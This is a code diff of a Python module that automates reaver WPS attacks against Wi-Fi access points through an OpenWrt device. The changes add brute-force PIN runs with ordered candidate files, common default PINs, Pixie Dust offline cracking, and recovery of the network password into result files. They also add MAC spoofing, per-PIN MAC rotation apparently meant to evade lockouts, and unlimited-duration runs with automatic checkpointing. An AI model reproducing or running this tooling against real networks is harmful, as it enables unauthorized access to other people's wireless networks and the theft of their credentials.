@@ -3,7 +3,16 @@
 import random
 import re
 import time
-from dataclasses import dataclass
+import sys
+from .models import CaptureCleanupError
+from .wps_observation import analyze, pixie_result_note
+from .wps_session import prepare_session, checkpoint
+from .wps_options import prepare_wps_options, spoof_mac_for
+from .wps_models import WpsTargetResult, WpsUpdate
+from .wps_results import write_wps_result
+from .wps_protocol_evidence import WpsProtocolEvidence
+from .wps_diagnostics import WpsDiagnosticTrace
+from .wps_timing import WpsCandidateTiming
 from pathlib import Path, PurePosixPath
 
 from modules.capture_services.openwrt.command_builder import (
@@ -11,7 +20,6 @@ from modules.capture_services.openwrt.command_builder import (
     normalize_channel,
     quote_argument,
 )
-from modules.capture_services.openwrt.result_converter import final_results_dir, safe_result_stem
 
 
 _PIN_RE = re.compile(r"WPS PIN:\s*(.+)", re.IGNORECASE)
@@ -32,33 +40,6 @@ _EXTRA_VALUE_OK = {
 
 # 秒 Pin 兜底常用默认 PIN（用户 partial 优先）；尽力而为，不保证命中。
 _COMMON_PINS = ("12345670", "00000000", "11111111", "22222222", "88888888")
-
-
-@dataclass(frozen=True)
-class WpsTargetResult:
-    """单个目标的 Pin 结局：PIN 与密码只写结果文件，不进消息与快照。"""
-
-    bssid: str
-    ssid: str
-    mode: str = ""
-    pin_ok: bool = False
-    psk_ok: bool = False
-    tried_seconds: int = 0
-    result_file: str = ""
-    wpc_file: str = ""
-    note: str = ""
-
-
-@dataclass(frozen=True)
-class WpsUpdate:
-    """W worker 发给主线程的进度，不携带 PIN 与密码内容。"""
-
-    elapsed: int
-    total: int
-    target_label: str = ""
-    target_index: int = 0
-    target_total: int = 0
-    phase: str = ""
 
 
 class OpenWrtWpsCapture:
@@ -114,6 +95,7 @@ class OpenWrtWpsCapture:
         workspace_manager,
         cancel_event=None,
         progress_callback=None,
+        *, diagnostic_index=0, diagnostic_total=None, diagnostic_trace=None, source_rotation=None,
     ):
         """对多个已扫描目标逐个跑 Pin，返回每目标结局元组。
 
@@ -121,45 +103,29 @@ class OpenWrtWpsCapture:
         其余与 H 任务同义。副作用：在远端工作目录运行 reaver，结束下载 .wpc。
         """
 
+        options = prepare_wps_options(options, mode=mode)
         local_output_dir = Path(local_output_dir)
         results = []
         for index, target in enumerate(targets):
             self._check_cancel(cancel_event)
-            results.append(
-                self._run_single(
-                    workspace,
-                    monitor_interface,
-                    session_id,
-                    target,
-                    mode,
-                    options,
-                    local_output_dir,
-                    workspace_manager,
-                    index,
-                    len(targets),
-                    cancel_event,
-                    progress_callback,
-                )
-            )
+            trace = diagnostic_trace or WpsDiagnosticTrace(session_id, diagnostic_index + index,
+                diagnostic_total or len(targets), target, mode, options)
+            result = error = None
+            try:
+                result = self._run_single(
+                    workspace, monitor_interface, session_id, target, mode, options,
+                    local_output_dir, workspace_manager, index, len(targets),
+                    cancel_event, progress_callback, diagnostic=trace, source_rotation=source_rotation)
+                results.append(result)
+            except Exception as exc:
+                error = exc
+                raise
+            finally:
+                trace.finish(result, error, bool(cancel_event is not None and cancel_event.is_set()))
         return tuple(results)
 
-    def _run_single(
-        self,
-        workspace,
-        monitor_interface,
-        session_id,
-        target,
-        mode,
-        options,
-        local_output_dir,
-        workspace_manager,
-        index,
-        total_targets,
-        cancel_event,
-        progress_callback,
-    ):
-        """跑单个目标：按模式组装多阶段 reaver 调用并解析输出。"""
-
+    @staticmethod
+    def skipped_result(target, mode, options=None):
         try:
             bssid = normalize_bssid(target.bssid)
             channel = normalize_channel(target.channel)
@@ -180,57 +146,177 @@ class OpenWrtWpsCapture:
                 bssid=bssid, ssid=ssid, mode=mode,
                 note="目标 WPS 已锁定，硬跑只会浪费时间，跳过。",
             )
-        attack_seconds = max(10, min(int(options.get("attack_seconds", 60) or 60), 3600))
-        attack_rounds = max(1, min(int(options.get("attack_rounds", 1) or 1), 20))
-        # 恢复文件只做准入校验（存在、非空、不超过 1MB），不猜 reaver 私有格式；
-        # 坏了就当没有并记因，不阻断任务。
+        if mode == "second":
+            from .wps_quick import quick_skip
+            return quick_skip(target, options or {})
+        return None
+
+    def _run_single(
+        self,
+        workspace,
+        monitor_interface,
+        session_id,
+        target,
+        mode,
+        options,
+        local_output_dir,
+        workspace_manager,
+        index,
+        total_targets,
+        cancel_event,
+        progress_callback,
+        *, diagnostic=None, source_rotation=None,
+    ):
+        """跑单个目标：按模式组装多阶段 reaver 调用并解析输出。"""
+
+        skipped = self.skipped_result(target, mode, options)
+        if skipped is not None:
+            if diagnostic is not None:
+                diagnostic.skipped(target)
+            return skipped
+        if options.get("rotate_mac_each_pin") and source_rotation is None:
+            raise RuntimeError("\u672a\u63d0\u4f9b\u5df2\u6838\u5b9e\u5f52\u5c5e\u7684 MAC \u5207\u6362\u63a7\u5236\uff0c\u672a\u542f\u52a8\u9010\u7801\u968f\u673a\u3002")
+        if mode == "second":
+            from .wps_quick import QuickWpsCapture
+            return QuickWpsCapture(self.process_manager, self._base_args).run(
+                workspace, monitor_interface, session_id, target, options,
+                local_output_dir, workspace_manager, index, total_targets,
+                cancel_event, progress_callback, diagnostic=diagnostic, source_rotation=source_rotation)
+        bssid = normalize_bssid(target.bssid)
+        ssid = str(target.ssid or "").strip() or bssid
+        label = ssid
+        configured_seconds = max(0, min(int(options.get("attack_seconds", 0) or 0), 3600))
+        unlimited = configured_seconds == 0
+        attack_seconds = float("inf") if unlimited else max(10, configured_seconds)
+        attack_rounds = 1 if unlimited else max(1, min(int(options.get("attack_rounds", 1) or 1), 20))
+        # Native session validation and automatic restore happen before launch.
         resume_note = ""
-        resume_path = str(options.get("resume_file", "") or "").strip()
-        if resume_path and not self._wpc_readable(resume_path):
-            resume_note = "恢复文件损坏或不可读，已忽略本次恢复。"
-            options = dict(options, resume_file="")
+        options = dict(options, _session_output=str(local_output_dir))
         total_budget = attack_seconds * attack_rounds
-        deadline = time.monotonic() + total_budget
+        started = time.monotonic()
+        deadline = started + total_budget
         tried = [0]
+        observed = ["", "", ""]
+        protocol_evidence = WpsProtocolEvidence()
+        ending = ["已完成设定轮数"]
+        saved_wpc = [""]
+        timing = WpsCandidateTiming()
+        no_reply = [False]
+
+        def elapsed_seconds():
+            elapsed = max(0, int(time.monotonic() - started))
+            return elapsed if unlimited else min(total_budget, elapsed)
 
         def report(phase):
             if progress_callback is not None:
-                elapsed = min(total_budget, int(time.monotonic() - (deadline - total_budget)))
+                elapsed = elapsed_seconds()
+                candidate_elapsed, average_per_minute = timing.snapshot()
                 progress_callback(
                     WpsUpdate(
-                        elapsed=elapsed, total=total_budget, target_label=label,
+                        elapsed=elapsed, total=0 if unlimited else total_budget, target_label=label,
                         target_index=index, target_total=total_targets, phase=phase,
+                        current_pin=observed[0], status=observed[1], target_bssid=bssid,
+                        candidate_elapsed=candidate_elapsed, average_per_minute=average_per_minute,
                     )
                 )
+
+        phase_count = [0]
+        phase_state = {}
 
         def run_phase(args, phase, budget):
             """跑一轮 reaver，返回 (pin, psk)，超时/取消返回空。"""
 
             pin, psk = None, None
             end = min(deadline, time.monotonic() + budget)
+            phase_state.clear()
+            timing.begin_phase()
+            phase_count[0] += 1
+            if diagnostic is not None:
+                diagnostic.phase(phase_count[0])
             handle = self.process_manager.start(
                 "reaver", args, f"{session_id}-wps{index}",
                 str(workspace.remote_dir), cancel_event,
+                max_runtime=0 if unlimited else max(60, int(budget) + 30),
+                **({"renewable_output": str(PurePosixPath(workspace.remote_dir) / "reaver.log")} if unlimited else {}),
             )
+            stop_reason = "time_budget"
+            observed[:] = ["", "等待工具状态", ""]
+            ending[0] = "\u672a\u8bbe\u7f6e\u603b\u65f6\u9650" if unlimited else "\u5df2\u8fbe\u5230\u8bbe\u5b9a\u7684\u8fd0\u884c\u65f6\u9650"
+            next_checkpoint = time.monotonic() + 20
+            from .process_lease import RENEW_SECONDS
+            next_renewal = time.monotonic() + RENEW_SECONDS
+            def consume(tail):
+                nonlocal pin, psk
+                pin, psk = self._scan_output(tail, pin, psk)
+                protocol_evidence.feed(tail)
+                timing.feed(tail)
+                if diagnostic is not None:
+                    diagnostic.feed(tail)
+                if "quitting after 1 crack attempts" in str(tail).lower():
+                    phase_state["single_limit"] = True
+                observation = analyze(tail)
+                if observation.current_pin: observed[0] = observation.current_pin
+                if observation.status: observed[1] = observation.status
+                if observation.stage: observed[2] = observation.stage
             try:
+                report(phase)
                 while time.monotonic() < end:
                     self._check_cancel(cancel_event)
                     if not self.process_manager.is_running(handle, cancel_event):
+                        stop_reason = "native_exit"
+                        phase_state["native_exit"] = True
+                        ending[0] = "Reaver 已提前退出（非本软件时限）"
                         break
+                    if unlimited and time.monotonic() >= next_renewal:
+                        self.process_manager.renew_watchdog(handle, cancel_event)
+                        next_renewal = time.monotonic() + RENEW_SECONDS
                     tail = self.process_manager.read_log_tail(handle, 100, cancel_event)
-                    pin, psk = self._scan_output(tail, pin, psk)
+                    consume(tail)
                     if psk:
+                        stop_reason = "credential_found"
                         break
                     report(phase)
-                    time.sleep(2)
+                    if timing.reply_timed_out():
+                        no_reply[0] = True
+                        stop_reason = "candidate_no_reply"
+                        ending[0] = "当前 PIN 连续 60 秒无有效 WPS 回复，已自动结束本目标"
+                        if diagnostic is not None:
+                            diagnostic.event("candidate_no_reply", seconds=60)
+                        break
+                    if time.monotonic() >= next_checkpoint:
+                        saved_wpc[0] = self._download_wpc(workspace, workspace_manager, bssid, local_output_dir, None) or saved_wpc[0]
+                        next_checkpoint = time.monotonic() + 20
+                    if cancel_event is not None:
+                        cancel_event.wait(2)
+                    else:
+                        time.sleep(2)
                 tail = self.process_manager.read_log_tail(handle, 100, None)
-                pin, psk = self._scan_output(tail, pin, psk)
+                consume(tail)
+                self._check_cancel(cancel_event)
             finally:
+                primary = sys.exc_info()[1]
+                if primary is not None:
+                    stop_reason = "cancelled" if cancel_event is not None and cancel_event.is_set() else "exception"
+                phase_state["stop_reason"] = stop_reason
+                cleanup = None
                 try:
-                    self.process_manager.stop(handle, cancel_event)
-                except Exception:
-                    pass
-            tried[0] = min(total_budget, int(time.monotonic() - (deadline - total_budget)))
+                    self.process_manager.stop(handle, None, graceful_signal="INT")
+                except Exception as exc:
+                    cleanup = exc
+                if diagnostic is not None:
+                    diagnostic.event("process_stopped", reason=stop_reason, cleanup_ok=cleanup is None)
+                    try:
+                        diagnostic.feed(self.process_manager.read_log_tail(handle, 100, None), final=True)
+                    except Exception:
+                        diagnostic.event("final_log_unavailable")
+                saved_wpc[0] = self._download_wpc(workspace, workspace_manager, bssid, local_output_dir, None) or saved_wpc[0]
+                if cleanup is not None:
+                    note = f"停止 Pin 进程失败：{cleanup}"
+                    raise CaptureCleanupError(f"{primary}；{note}" if primary else note, (note,)) from cleanup
+                if cancel_event is not None and cancel_event.is_set():
+                    note = "进度已自动保存，下次自动恢复" if saved_wpc[0] else "未获得新的可保存进度，已保留以前进度"
+                    raise RuntimeError(f"WPS 任务已取消；{note}；{protocol_evidence.describe()}。") from primary
+            tried[0] = elapsed_seconds()
             return pin, psk
 
         base = self._base_args(
@@ -238,34 +324,40 @@ class OpenWrtWpsCapture:
             cancel_event,
         )
         pin, psk = None, None
-        if mode == "second":
-            for candidate in self._second_pins(options):
-                self._check_cancel(cancel_event)
-                if time.monotonic() >= deadline:
-                    break
-                pin, psk = run_phase(f"{base} -p {quote_argument(candidate)}", "秒Pin", attack_seconds)
-                if psk or pin:
-                    pin = pin or candidate
-                    break
+        if mode == "normal" and options.get("rotate_mac_each_pin"):
+            from .wps_rotation import run_rotating_normal
+            from .wps_session import session_name
+            def rotating_command():
+                rotated = source_rotation.next_options(options, cancel_event)
+                if diagnostic is not None:
+                    diagnostic.event("source_rotated", verified=True)
+                return self._base_args(workspace, monitor_interface, target, mode, rotated,
+                    workspace_manager, cancel_event,
+                    session_path=str(PurePosixPath(workspace.remote_dir) / session_name(bssid)))
+            pin, psk, rotation_note = run_rotating_normal(bssid, deadline, rotating_command,
+                lambda args, remaining: run_phase(args, "常规Pin", remaining), phase_state,
+                lambda: saved_wpc[0], lambda: no_reply[0], lambda: self._check_cancel(cancel_event))
+            if rotation_note:
+                ending[0] = rotation_note
         elif mode == "offline":
-            pin, psk = run_phase(f"{base} -K 1", "离线Pin", total_budget)
-            if pin and not psk and time.monotonic() < deadline:
+            pin, psk = run_phase(f"{base} -K 1", "Pixie Dust", total_budget)
+            if pin and not psk and not no_reply[0] and time.monotonic() < deadline:
                 pin2, psk2 = run_phase(
-                    f"{base} -p {quote_argument(pin)}", "秒Pin", min(attack_seconds, max(0, deadline - time.monotonic()))
+                    f"{base} -p {quote_argument(pin)}", "验证已恢复 Pin", min(attack_seconds, max(0, deadline - time.monotonic()))
                 )
                 pin, psk = pin2 or pin, psk2
         elif mode == "combo":
             for candidate in self._second_pins(options):
                 self._check_cancel(cancel_event)
-                if time.monotonic() >= deadline:
+                if no_reply[0] or time.monotonic() >= deadline:
                     break
                 pin, psk = run_phase(f"{base} -p {quote_argument(candidate)}", "秒Pin", attack_seconds)
                 if psk or pin:
                     pin = pin or candidate
                     break
-            if not psk and time.monotonic() < deadline:
+            if not psk and not no_reply[0] and time.monotonic() < deadline:
                 pin, psk = run_phase(f"{base} -K 1", "离线Pin", max(0, deadline - time.monotonic()))
-                if pin and not psk and time.monotonic() < deadline:
+                if pin and not psk and not no_reply[0] and time.monotonic() < deadline:
                     pin2, psk2 = run_phase(
                         f"{base} -p {quote_argument(pin)}", "秒Pin", max(0, deadline - time.monotonic())
                     )
@@ -273,29 +365,27 @@ class OpenWrtWpsCapture:
         else:
             for _wheel in range(attack_rounds):
                 self._check_cancel(cancel_event)
-                if time.monotonic() >= deadline:
+                if no_reply[0] or time.monotonic() >= deadline:
                     break
                 pin, psk = run_phase(base, "常规Pin", attack_seconds)
                 if psk or pin:
                     break
         wpc_file = self._download_wpc(
             workspace, workspace_manager, bssid, local_output_dir, cancel_event
-        )
-        result_file = ""
-        if pin or psk:
-            stem = safe_result_stem(ssid, bssid)
-            out_path = final_results_dir(local_output_dir) / f"{stem}-wps.txt"
-            # PIN 与密码只写结果文件，不进日志、消息和快照。
-            lines = [f"MAC地址: {bssid}", f"信号名称: {ssid}", f"PIN码: {pin or ''}"]
-            if psk:
-                lines.append(f"密码: {psk}")
-            else:
-                lines.append("提示：仅拿到 PIN，可用该 PIN 连接或再跑一次。")
-            out_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
-            result_file = str(out_path)
+        ) or saved_wpc[0]
+        result_file = write_wps_result(local_output_dir, ssid, bssid, pin, psk)
         note = resume_note
-        if not pin and not psk:
-            note = "；".join(filter(None, [note, "本轮未跑出 PIN 或密码。"]))
+        if not psk:
+            note = "；".join(filter(None, [note, ending[0], observed[1], protocol_evidence.describe()]))
+            if not pin:
+                explanation = (pixie_result_note(observed[2]) if mode in {"second", "offline"}
+                               else "本次未获得 PIN 或密码，不代表已穷尽全部候选")
+                note = "；".join(filter(None, [note, explanation.rstrip("。")]))
+        if wpc_file:
+            note = "；".join(filter(None, [note, "进度文件已自动保存（不表示 PIN 已验证成功）"]))
+        elif mode not in {"second", "offline"}:
+            note = "；".join(filter(None, [note, "未获得新的可保存进度，以前进度保留"]))
+        timing.freeze()
         report("结束")
         return WpsTargetResult(
             bssid=bssid, ssid=ssid, mode=mode,
@@ -331,7 +421,7 @@ class OpenWrtWpsCapture:
 
     def _base_args(
         self, workspace, monitor_interface, target, run_mode, options,
-        workspace_manager, cancel_event,
+        workspace_manager, cancel_event, *, session_path=None,
     ):
         """组装 reaver 公共参数（含会话恢复与伪装），返回完整命令。"""
 
@@ -339,7 +429,7 @@ class OpenWrtWpsCapture:
         channel = normalize_channel(target.channel)
         parts = [
             f"cd {quote_argument(str(workspace.remote_dir))} &&",
-            "reaver",
+            "exec reaver",
             "-n",
             f"-i {quote_argument(monitor_interface)}",
             f"-b {quote_argument(bssid)}",
@@ -352,24 +442,14 @@ class OpenWrtWpsCapture:
         ]
         if str(getattr(target, "band", "2.4G") or "2.4G") == "5G":
             parts.append("-5")
-        if bool(options.get("spoof_mac_enabled", False)):
-            try:
-                mac = normalize_bssid(options.get("spoof_mac", ""))
-            except ValueError as exc:
-                raise RuntimeError(f"伪装 MAC 格式不正确：{exc}")
+        mac = spoof_mac_for(options)
+        if mac:
             parts.extend(["-m", quote_argument(mac)])
-        resume = str(options.get("resume_file", "") or "").strip()
-        if resume:
-            remote_resume = PurePosixPath(workspace.remote_dir) / "resume.wpc"
-            workspace_manager.upload_atomic(Path(resume), remote_resume)
-            parts.extend(["-s", quote_argument(str(remote_resume))])
-        elif run_mode == "normal":
-            # 排序表只用于常规 Pin；秒 Pin/离线 Pin 用 -p/-K 直跑。
-            order_file = self._build_order_wpc(
-                options, bssid, workspace, workspace_manager, cancel_event
-            )
-            if order_file:
-                parts.extend(["-s", quote_argument(order_file)])
+        builder = (lambda: self._build_order_wpc(options, bssid, workspace, workspace_manager, cancel_event)) if run_mode == "normal" else None
+        if session_path is None:
+            session_path, _restored = prepare_session(workspace, workspace_manager, bssid, options,
+                options.get("_session_output", workspace.local_dir), builder)
+        parts.extend(["-s", quote_argument(session_path)])
         extra = self.sanitize_extra_args(options.get("additional_args", ""))
         if extra:
             parts.append(extra)
@@ -392,7 +472,7 @@ class OpenWrtWpsCapture:
         local = Path(workspace.local_dir) / f"{bssid.replace(':', '').upper()}.wpc"
         try:
             local.parent.mkdir(parents=True, exist_ok=True)
-            local.write_text("\n".join(pins) + "\n", encoding="ascii")
+            local.write_bytes(("0\n0\n0\n" + "\n".join(pins) + "\n" + "\n".join(f"{n:03d}" for n in range(1000)) + "\n").encode("ascii"))
             remote = PurePosixPath(workspace.remote_dir) / local.name
             workspace_manager.upload_atomic(local, remote)
         except (OSError, ValueError):
@@ -412,20 +492,7 @@ class OpenWrtWpsCapture:
     def _download_wpc(self, workspace, workspace_manager, bssid, local_output_dir, cancel_event):
         """下载 reaver 会话 .wpc，缺失或损坏返回空串，不阻断主流程。"""
 
-        name = f"{bssid.replace(':', '').upper()}.wpc"
-        remote = PurePosixPath(workspace.remote_dir) / name
-        local = final_results_dir(local_output_dir) / name
-        try:
-            workspace_manager.download_atomic(remote, local)
-        except Exception:
-            return ""
-        if not self._wpc_readable(str(local)):
-            try:
-                local.unlink()
-            except OSError:
-                pass
-            return ""
-        return str(local)
+        return checkpoint(workspace, workspace_manager, bssid, local_output_dir)
 
     @staticmethod
     def _check_cancel(cancel_event):
